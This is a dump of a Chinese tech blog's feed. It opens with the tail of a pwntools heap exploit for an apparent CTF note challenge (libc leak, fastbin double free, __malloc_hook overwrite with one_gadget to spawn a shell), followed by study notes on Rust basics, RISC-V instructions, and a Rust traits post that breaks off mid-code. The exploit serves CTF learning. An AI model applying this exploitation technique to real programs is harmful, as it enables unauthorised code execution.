class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&quot;5.Exit\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cre</span>(<span class="params">size,note,chunkcon</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;How long is your note?\n&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;Input your note name and note content:&#x27;</span>,note)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    s(chunkcon)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index:\n&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    ru(<span class="string">b&#x27;Name &#x27;</span>)</span><br><span class="line">    name = ru(<span class="string">&quot;\n&quot;</span>).strip()</span><br><span class="line">    ru(<span class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line">    con = ru(<span class="string">&quot;\n&quot;</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> name,con</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index:\n&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">index,letter,last</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index:\n&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;Which letter do you want to change?\n&#x27;</span>,letter)</span><br><span class="line">    s(last)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ex</span>():</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">cre(<span class="number">600</span>,<span class="number">16</span>*<span class="string">b&#x27;a&#x27;</span>+p32(<span class="number">0x1</span>)+<span class="string">b&#x27;\x00&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;b&#x27;</span>) <span class="comment">#index = 0</span></span><br><span class="line">cre(<span class="number">0x67</span>,<span class="number">16</span>*<span class="string">b&#x27;a&#x27;</span>+p32(<span class="number">0x1</span>)+<span class="string">b&#x27;\x00&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;b&#x27;</span>) <span class="comment">#index = 1 </span></span><br><span class="line">de(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>,<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">name,con = show(<span class="number">0</span>)</span><br><span class="line">libcbase = u64(con.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) + <span class="number">0x7f023dc0f000</span> - <span class="number">0x7f023dfd3b78</span></span><br><span class="line">li(<span class="string">&quot;libcbase&quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cre(<span class="number">0x67</span>,<span class="number">16</span>*<span class="string">b&#x27;a&#x27;</span>+p32(<span class="number">0x1</span>)+<span class="string">b&#x27;\x00&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;b&#x27;</span>) <span class="comment">#index = 2</span></span><br><span class="line">cre(<span class="number">0x88</span>,<span class="number">16</span>*<span class="string">b&#x27;a&#x27;</span>+p32(<span class="number">0x1</span>)+<span class="string">b&#x27;\x00&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;b&#x27;</span>) <span class="comment">#index = 3(pro)</span></span><br><span class="line">de(<span class="number">1</span>)</span><br><span class="line">de(<span class="number">2</span>)</span><br><span class="line">change(<span class="number">1</span>,<span class="string">b&#x27;\x00&#x27;</span>,<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">de(<span class="number">1</span>)</span><br><span class="line">de(<span class="number">3</span>)</span><br><span class="line">__libc_reallocadd = libcbase + elf.symbols[<span class="string">&quot;__libc_realloc&quot;</span>]</span><br><span class="line">one = [libcbase + <span class="number">0x4526a</span>,libcbase +<span class="number">0xf02a4</span> ,libcbase +<span class="number">0xf1147</span>]</span><br><span class="line">cre(<span class="number">0x67</span>,<span class="number">16</span>*<span class="string">b&#x27;a&#x27;</span>+p32(<span class="number">0x1</span>)+<span class="string">b&#x27;\x00&#x27;</span>,p64(libcbase + <span class="number">0x7f57acdb3af5</span>-<span class="number">0x8</span>-<span class="number">0x7f57ac9ef000</span>))<span class="comment">#index = 1  change</span></span><br><span class="line">cre(<span class="number">0x67</span>,<span class="number">16</span>*<span class="string">b&#x27;a&#x27;</span>+p32(<span class="number">0x1</span>)+<span class="string">b&#x27;\x00&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;b&#x27;</span>)<span class="comment">#index = 2</span></span><br><span class="line">cre(<span class="number">0x67</span>,<span class="number">16</span>*<span class="string">b&#x27;a&#x27;</span>+p32(<span class="number">0x1</span>)+<span class="string">b&#x27;\x00&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;b&#x27;</span>)<span class="comment">#index = 3</span></span><br><span class="line"></span><br><span class="line">cre(<span class="number">0x67</span>,<span class="number">16</span>*<span class="string">b&#x27;a&#x27;</span>+p32(<span class="number">0x1</span>)+<span class="string">b&#x27;\x00&#x27;</span>,(<span class="number">0xb08</span>-<span class="number">0xaf5</span>-<span class="number">0x8</span>)*<span class="string">b&#x27;b&#x27;</span>+p64(one[<span class="number">0</span>])+p64(__libc_reallocadd+<span class="number">12</span>))<span class="comment">#index = 4</span></span><br><span class="line">de(<span class="number">1</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">b&#x27;How long is your note?\n&#x27;</span>,<span class="string">b&#x27;24&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="file-LIST-ALL"><a href="#file-LIST-ALL" class="headerlink" title="file_LIST_ALL"></a>file_LIST_ALL</h2><blockquote>
<p><a href="https://cord-nape-83b.notion.site/apple2-ecb92e976ae74ff3a1f5788d4623ced7">https://cord-nape-83b.notion.site/apple2-ecb92e976ae74ff3a1f5788d4623ced7</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/09/04/language/rust/</url>
    <content><![CDATA[<p>从现在开始进行rust语言的学习。</p>
<h2 id="1-基础概念"><a href="#1-基础概念" class="headerlink" title="1.基础概念"></a>1.基础概念</h2><blockquote>
<p>此部分比较简单，基本上是每个语言都有的概念</p>
<p>c语言的差异：1.静态类型  2.没有隐式类型转换。</p>
</blockquote>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><blockquote>
<p>主要分为标量以及复合类型，具体可参考<a href="https://kaisery.github.io/trpl-zh-cn/ch03-02-data-types.html">https://kaisery.github.io/trpl-zh-cn/ch03-02-data-types.html</a></p>
<p>标量：整型、浮点型、布尔类型和字符类型。</p>
<p>复合类型：Rust 有两个原生的复合类型：元组（tuple）和数组（array）。</p>
</blockquote>
<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><blockquote>
<p>要搞清楚可变变量和不可变变量（默认），以及常量（c语言是运行时检查的，加上const关键字）</p>
<p>也要搞清楚什么是变量遮掩。（<strong>Shadowing</strong>）可以和作用域以及别名来联想对比学习。</p>
</blockquote>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><blockquote>
<p>和一般的函数没什么不同，无非就是返回值，名称以及参数，函数的最后一个表达式的值默认为返回值（下面会讲解表达式）</p>
</blockquote>
<h3 id="语句以及表达式"><a href="#语句以及表达式" class="headerlink" title="语句以及表达式"></a>语句以及表达式</h3><blockquote>
<p><strong>语句</strong>（<em>Statements</em>）是执行一些操作但不返回值的指令。 <strong>表达式</strong>（<em>Expressions</em>）计算并产生一个值.</p>
<p>{}是比较常见的表达式。</p>
</blockquote>
<h3 id="控制流"><a href="#控制流" class="headerlink" title="控制流"></a>控制流</h3><blockquote>
<p>无非就是改变程序的原本的执行流程的一些功能，是一种特殊的表达式。</p>
<h3 id="关于if：在-Rust-中，if-表达式的返回值是它执行的分支中最后一个表达式的值，不同分支必须返回相同类型。并且条件-必须-是-bool-值"><a href="#关于if：在-Rust-中，if-表达式的返回值是它执行的分支中最后一个表达式的值，不同分支必须返回相同类型。并且条件-必须-是-bool-值" class="headerlink" title="关于if：在 Rust 中，if 表达式的返回值是它执行的分支中最后一个表达式的值，不同分支必须返回相同类型。并且条件 必须 是 bool 值"></a>关于if：在 Rust 中，<code>if</code> 表达式的返回值是它执行的分支中最后一个表达式的值，不同分支必须返回相同类型。并且条件 <strong>必须</strong> 是 <code>bool</code> 值</h3><h3 id="关于循环：Rust-有三种循环：loop、while-和-for只有loop是表达式可以返回值-且loop可以跳出嵌套循环。"><a href="#关于循环：Rust-有三种循环：loop、while-和-for只有loop是表达式可以返回值-且loop可以跳出嵌套循环。" class="headerlink" title="关于循环：Rust 有三种循环：loop、while 和 for只有loop是表达式可以返回值,且loop可以跳出嵌套循环。"></a>关于循环：Rust 有三种循环：<code>loop</code>、<code>while</code> 和 <code>for</code>只有loop是表达式可以返回值,且loop可以跳出嵌套循环。</h3><h3 id="for和while：for基本上和可迭代对象搭配在一起使用，而while的用法和if差不多。"><a href="#for和while：for基本上和可迭代对象搭配在一起使用，而while的用法和if差不多。" class="headerlink" title="for和while：for基本上和可迭代对象搭配在一起使用，而while的用法和if差不多。"></a>for和while：for基本上和可迭代对象搭配在一起使用，而while的用法和if差不多。</h3></blockquote>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">count</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="symbol">&#x27;counting_up</span>: <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;count = &#123;count&#125;&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">remaining</span> = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">loop</span> &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;remaining = &#123;remaining&#125;&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> remaining == <span class="number">9</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> count == <span class="number">2</span> &#123;</span><br><span class="line">                <span class="keyword">break</span> <span class="symbol">&#x27;counting_up</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            remaining -= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        count += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;End count = &#123;count&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-所有权"><a href="#2-所有权" class="headerlink" title="2.所有权"></a>2.所有权</h2><blockquote>
<p>这一部分讲解的是关于rust的自动垃圾回收的一些原理</p>
<p><strong>important rule：</strong></p>
<ol>
<li><strong>Rust 中的每一个值都有一个 所有者（<em>owner</em>）。</strong></li>
<li><strong>值在任一时刻有且只有一个所有者。</strong></li>
<li><strong>当所有者（变量）离开作用域，这个值将被丢弃。</strong></li>
</ol>
<p>这个垃圾回收主要是针对分配在堆上的复杂数据类型而基本数据类型分配在栈上是不需要GC的功能的。</p>
<p>以下的代码片段可以说明上述观点：</p>
</blockquote>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>); <span class="comment">// 从此处起，s 是有效的</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 s</span></span><br><span class="line">&#125;                                  <span class="comment">// 此作用域已结束，</span></span><br><span class="line">                                   <span class="comment">// s 不再有效</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>理解这部分内容需要知道变量和数据的交互方式，基本分为以下三种：</p>
<p>1.移动：也就是说每一个变量的所在地址都拥有一个值的副本，基本数据类型没有问题，但是涉及到类似string类型（在堆中分配），那就有问题了，都知道引用堆中数据是靠指针，那么两个地址分配同一个指针那么在释放的时候就会出现double free的错误，因此需要调整，这里貌似是直接使之前的变量失效（根据import rules）。</p>
<p>2.克隆：解决了string这种复杂类型的拷贝问题，但是需要调用clone函数而不是简单的赋值</p>
</blockquote>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*clone示例*/</span></span><br><span class="line">	<span class="keyword">let</span> <span class="variable">s1</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s2</span> = s1.<span class="title function_ invoke__">clone</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;s1 = &#123;s1&#125;, s2 = &#123;s2&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>此部分探讨函数参数的传递问题</p>
<p>函数的传递类似于所有权的调整，因此当在函数调用前声明一个复杂类型的话，那么传递给函数参数的时候此变量就会失效，在函数返回时需要再抛出一个同种类型的变量给失效变量。非常繁琐，因此需要另一种解决方法。那么就需要了解引用。</p>
<p>引用的本质就是虽然无法将同一个堆区域分配给多个变量，但是可以将变量的地址来分配给另一个变量以此来实现多个变量控制一块堆区域，类似于c中的指针的指针，因此很好的解决的复杂类型的移动的问题。但也有要注意的地方：如下函数获得了一个已销毁的变量的引用，会出现大问题。</p>
<p>还有需要注意的一个点：一次只能存在一个可变引用。</p>
</blockquote>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">no_dangle</span>() <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &amp;s</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>可改为：</p>
</blockquote>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">no_dangle</span>() <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>此部分探讨了slice类型，感觉就是部分字符串的引用，需要注意其是不可变的即可。</p>
</blockquote>
<h2 id="3-复合数据类型"><a href="#3-复合数据类型" class="headerlink" title="3.复合数据类型"></a>3.复合数据类型</h2><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><blockquote>
<p>没什么复杂的，就是有一个方法的概念，其他的和c语言的差不了多少。</p>
<p>直接看：<a href="https://kaisery.github.io/trpl-zh-cn/ch05-03-method-syntax.html%E4%B8%8D%E6%83%B3%E6%80%BB%E7%BB%93%E4%BA%86">https://kaisery.github.io/trpl-zh-cn/ch05-03-method-syntax.html不想总结了</a></p>
</blockquote>
<h3 id="枚举和模式匹配"><a href="#枚举和模式匹配" class="headerlink" title="枚举和模式匹配"></a><a href="https://kaisery.github.io/trpl-zh-cn/ch06-00-enums.html#%E6%9E%9A%E4%B8%BE%E5%92%8C%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D">枚举和模式匹配</a></h3><blockquote>
<p>感觉教程上讲的有点乱，无法知道其在二进制文件中的存储模式。网上查了一下，rust中的枚举类似于c语言的union这样就清晰多了。</p>
<p>模式匹配类似于switch，是个表达式，可以返回值</p>
<p>match的简介写法，if let</p>
</blockquote>
<h2 id="4-项目管理"><a href="#4-项目管理" class="headerlink" title="4.项目管理"></a>4.项目管理</h2><blockquote>
<p>从现在开始学习项目管理的一些知识。</p>
</blockquote>
<h3 id="crate"><a href="#crate" class="headerlink" title="crate"></a>crate</h3><blockquote>
<p>crate 是 Rust 在编译时最小的代码单位。crate 有两种形式：二进制项和库。</p>
</blockquote>
<h3 id="package"><a href="#package" class="headerlink" title="package"></a>package</h3><blockquote>
<p>为一个项目，包含多个crate，但是只有一个可以充当入口点为main.rs，同理库也有一个入口点为：lib.rs</p>
</blockquote>
<h3 id="modele"><a href="#modele" class="headerlink" title="modele"></a>modele</h3><blockquote>
<p>包中的一部分，为了实现声明与实现相分离</p>
</blockquote>
<p>总的来说main.rs就相当于c语言中的main.c，而lib.rs就相当于头文件，而其他的crate就相当于其他的.c文件。可以将定义定义在多个文件中，只要最后在lib.rs中写上声明即可，当然模块分散在整个项目中，编译器需要路径才能很好处理，而为了每次简写模块路径有一种use的使用方法。	</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/09/06/qemu%E5%AE%9E%E9%AA%8C/riscv%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<blockquote>
<p><a href="https://riscv.org/wp-content/uploads/2017/05/riscv-spec-v2.2.pdf">https://riscv.org/wp-content/uploads/2017/05/riscv-spec-v2.2.pdf</a></p>
</blockquote>
<h2 id="1-异常中断与陷阱"><a href="#1-异常中断与陷阱" class="headerlink" title="1.异常中断与陷阱"></a>1.异常中断与陷阱</h2><p>我们使用术语“异常（exception）”来指代在当前RISC-V线程中，与指令运行时相关联的非正常情况。我们使用术语“陷阱（trap）”来指代因RISC-V线程中发生的异常情况而引发的同步控制转移至陷阱处理程序。陷阱处理程序通常在更加特权的环境中执行。</p>
<p>我们使用术语“中断（interrupt）”来指代一个与当前RISC-V线程异步发生的外部事件。当必须处理的中断发生时，某条指令会被选中接收到中断异常，随后引发陷阱。</p>
<p>接下来的章节描述了在执行过程中会引发异常的条件。这些条件如何转变为陷阱取决于执行环境，尽管大多数情况下，当发生异常时，系统通常会引发精确陷阱（precise trap）（除了标准浮点扩展中的浮点异常，这种异常不会引发陷阱）。</p>
<p>就像实验里看到的那样，异常是强制处理的，而中断是可控的，他们都会陷入（trap）处理程序</p>
<h2 id="2-base-integer-subset"><a href="#2-base-integer-subset" class="headerlink" title="2.base integer subset"></a>2.base integer subset</h2><p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240906204343875.png" alt="image-20240906204343875"></p>
<h2 id="3-instruction-format"><a href="#3-instruction-format" class="headerlink" title="3.instruction format"></a>3.instruction format</h2><blockquote>
<p>总体分为四种</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240906205422774.png" alt="image-20240906205422774"></p>
<p><strong>四种核心指令格式</strong>：</p>
<ul>
<li>R-type（寄存器类型）：用于纯寄存器到寄存器的操作。</li>
<li>I-type（立即数类型）：用于包含立即数的指令，立即数与寄存器进行操作。</li>
<li>S-type（存储类型）：用于存储指令，将数据存储到内存中。</li>
<li>U-type（上半部分立即数类型）：用于加载大数值，特别是32位宽的立即数。</li>
</ul>
<p><strong>对齐要求</strong>：</p>
<ul>
<li>指令的长度为固定的32位，并且必须在内存中按照4字节边界对齐。如果在分支或跳转时，目标地址未对齐，会生成地址未对齐异常。</li>
<li>如果有16位或16位倍数的扩展指令加入，指令的对齐要求可以放宽到2字节边界。</li>
</ul>
<p><strong>立即数扩展</strong>：</p>
<ul>
<li>各指令类型中的立即数通常使用符号扩展（sign-extended），尤其是最高位（bit 31）保留为符号位，以简化硬件的符号扩展操作。</li>
</ul>
<p><strong>统一寄存器位置</strong>：</p>
<ul>
<li>在所有指令格式中，寄存器的位置（如<code>rs1</code>、<code>rs2</code>和<code>rd</code>）被设计为在同一个位置，以简化指令解码。</li>
</ul>
<h3 id="3-1-extented-instruction-format"><a href="#3-1-extented-instruction-format" class="headerlink" title="3.1 extented instruction format"></a>3.1 extented instruction format</h3><blockquote>
<p>There are a further two variants of the instruction formats (B&#x2F;J) based on the handling of immediates</p>
<p>进一步的变体，为B和J型指令，S型指令的立即数最低位是空闲的，因此可以给B型指令的最高位。</p>
<p>因为S指令要左移2位，而B只需左移一位，因此需要上述调整</p>
<p>同理，J型指令和U型指令也是这个意思</p>
<p>U型格式和J型格式的唯一区别在于，20位的立即数在U型格式中左移12位以形成U型立即数，而在J型格式中左移1位以形成J型立即数。U型和J型格式中立即数字段的位置选择是为了最大限度地与其他格式以及彼此之间重叠。</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240906211043005.png" alt="image-20240906211043005"></p>
<h2 id="4-Basic-Instructions"><a href="#4-Basic-Instructions" class="headerlink" title="4.Basic Instructions"></a>4.Basic Instructions</h2><blockquote>
<p>这一部分讲解基本指令，不涉及扩展,RISCV-32</p>
</blockquote>
<h3 id="4-1-Integer-Computational-Instructions"><a href="#4-1-Integer-Computational-Instructions" class="headerlink" title="4.1 Integer Computational Instructions"></a>4.1 Integer Computational Instructions</h3><blockquote>
<p>Integer computational instructions are either encoded as register-immediate operations using the I-type format or as register-register operations using the R-type format. The destination is register rd for both register-immediate and register-register instructions. No integer computational instructions cause arithmetic exceptions.</p>
<p>多为R型，I型，U型指令</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240906213200504.png" alt="image-20240906213200504"></p>
<blockquote>
<p><strong>ADDI</strong> adds the sign-extended 12-bit immediate to register rs1. Arithmetic overflow is ignored and the result is simply the low XLEN bits of the result. ADDI rd, rs1, 0 is used to implement the MV rd, rs1 assembler pseudo-instruction.</p>
<p>**SLTI (set less than immediate) **places the value 1 in register rd if register rs1 is less than the signextended immediate when both are treated as signed numbers, else 0 is written to rd. SLTIU is similar but compares the values as unsigned numbers (i.e., the immediate is first sign-extended to XLEN bits then treated as an unsigned number). Note, SLTIU rd, rs1, 1 sets rd to 1 if rs1 equals zero, otherwise sets rd to 0 (assembler pseudo-op SEQZ rd, rs).</p>
<p><strong>ANDI, ORI, XORI</strong> are logical operations that perform bitwise AND, OR, and XOR on register rs1 and the sign-extended 12-bit immediate and place the result in rd. Note, XORI rd, rs1, -1 performs a bitwise logical inversion of register rs1 (assembler pseudo-instruction NOT rd, rs).</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240906214339823.png" alt="image-20240906214339823"></p>
<blockquote>
<p>Shifts by a constant are encoded as a specialization of the I-type format. The operand to be shifted is in rs1, and the shift amount is encoded in the lower 5 bits of the I-immediate field. The right shift type is encoded in a high bit of the I-immediate. SLLI is a logical left shift (zeros are shifted into the lower bits); SRLI is a logical right shift (zeros are shifted into the upper bits); and SRAI is an arithmetic right shift (the original sign bit is copied into the vacated upper bits).</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240906214940669.png" alt="image-20240906214940669"></p>
<blockquote>
<p>**LUI (load upper immediate) **is used to build 32-bit constants and uses the U-type format. LUI places the U-immediate value in the top 20 bits of the destination register rd, filling in the lowest 12 bits with zeros.</p>
<p><strong>AUIPC (add upper immediate to pc)</strong> is used to build pc-relative addresses and uses the U-type format. AUIPC forms a 32-bit offset from the 20-bit U-immediate, filling in the lowest 12 bits with zeros, adds this offset to the pc, then places the result in register rd.</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240906215443959.png" alt="image-20240906215443959"></p>
<blockquote>
<p>ADD and SUB perform addition and subtraction respectively. Overflows are ignored and the low XLEN bits of results are written to the destination. SLT and SLTU perform signed and unsigned compares respectively, writing 1 to rd if rs1 &lt; rs2, 0 otherwise. Note, SLTU rd, x0, rs2 sets rd to 1 if rs2 is not equal to zero, otherwise sets rd to zero (assembler pseudo-op SNEZ rd, rs). AND, OR, and XOR perform bitwise logical operations. SLL, SRL, and SRA perform logical left, logical right, and arithmetic right shifts on the value in register rs1 by the shift amount held in the lower 5 bits of register rs2</p>
<p>需要注意的是，移位指令只有寄存器中的低五位是有效的</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240906235027623.png" alt="image-20240906235027623"></p>
<blockquote>
<p>The NOP instruction does not change any user-visible state, except for advancing the pc. NOP is encoded as ADDI x0, x0, 0.</p>
<p>可以用来particular对齐，或者inline代码嵌入</p>
</blockquote>
<h3 id="4-2-Control-Transfer-Instructions"><a href="#4-2-Control-Transfer-Instructions" class="headerlink" title="4.2 Control Transfer Instructions"></a>4.2 Control Transfer Instructions</h3><blockquote>
<p>主要提供了两种，一种条件跳转，一种无条件跳转</p>
</blockquote>
<h4 id="4-2-1-Unconditional-Jumps"><a href="#4-2-1-Unconditional-Jumps" class="headerlink" title="4.2.1 Unconditional Jumps"></a>4.2.1 Unconditional Jumps</h4><blockquote>
<p>主要是JAL和JALR指令，分别以J型和I型的格式编码，因此跳转的地址范围有所不同，并且目标地址的计算方式也不同。</p>
<p><strong>JAL</strong>:The offset is sign-extended and added to the pc to form the jump target address. Jumps can therefore target a ±1 MiB range. JAL stores the address of the instruction following the jump (pc+4) into register rd</p>
<p>Plain unconditional jumps (assembler pseudo-op J) are encoded as a JAL with rd&#x3D;x0.</p>
<p><strong>JALR</strong>:The indirect jump instruction JALR (jump and link register) uses the I-type encoding. The target address is obtained by adding the 12-bit signed I-immediate to the register rs1, then setting the least-significant bit of the result to zero. The address of the instruction following the jump (pc+4) is written to register rd. Register x0 can be used as the destination if the result is not required.</p>
<p>The standard software calling convention uses x1 as the return address register and x5 as an alternate link register.</p>
<p><strong>x1</strong> 是主要的返回地址寄存器，处理一般的函数调用。</p>
<p><strong>x5</strong> 是备用寄存器，在某些特殊情况下用作保存临时返回地址，避免与 <strong>x1</strong> 冲突。</p>
<p>细节：关于返回地址调用栈</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240907000155135.png" alt="image-20240907000155135"></p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240907000208609.png" alt="image-20240907000208609"></p>
<h4 id="4-2-2Conditional-Jumps"><a href="#4-2-2Conditional-Jumps" class="headerlink" title="4.2.2Conditional Jumps"></a>4.2.2Conditional Jumps</h4><blockquote>
<p>All branch instructions use the B-type instruction format. The 12-bit B-immediate encodes signed offsets in multiples of 2, and is added to the current pc to give the target address. The conditional branch range is ±4 KiB.</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240907003421985.png" alt="image-20240907003421985"></p>
<blockquote>
<p>Branch instructions compare two registers. BEQ and BNE take the branch if registers rs1 and rs2 are equal or unequal respectively. BLT and BLTU take the branch if rs1 is less than rs2, using signed and unsigned comparison respectively. BGE and BGEU take the branch if rs1 is greater than or equal to rs2, using signed and unsigned comparison respectively. Note, BGT, BGTU, BLE, and BLEU can be synthesized by reversing the operands to BLT, BLTU, BGE, and BGEU, respectively.</p>
<p>软件应该根据架构的分支预测特性来优化代码。</p>
</blockquote>
<h3 id="4-3-Load-and-Store-Instructions"><a href="#4-3-Load-and-Store-Instructions" class="headerlink" title="4.3 Load and Store Instructions"></a>4.3 Load and Store Instructions</h3>]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/09/08/rust/rust%E4%B9%8Btrait/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>trait特性是rust中比较重要的，类似于c++中的虚函数特性，但是从对象为主导，变成了以函数为主导，第一感觉rust像是面向函数式编程。</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><blockquote>
<p>可以先定义trait定义一组方法，然后绑定给不同的数据结构，然后可以根据数据结构的不同访问不同的方法,也有c++中类似于动态绑定的概念，但是要比继承简单很多。</p>
</blockquote>
<p>示例：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">trait</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">area</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">f64</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Circle</span> &#123;</span><br><span class="line">    radius: <span class="type">f64</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Square</span> &#123;</span><br><span class="line">    side: <span class="type">f64</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Shape</span> <span class="keyword">for</span> <span class="title class_">Circle</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">area</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">f64</span> &#123;</span><br><span class="line">        <span class="number">3.14</span> * <span class="keyword">self</span>.radius * <span class="keyword">self</span>.radius</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Shape</span> <span class="keyword">for</span> <span class="title class_">Square</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">area</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">f64</span> 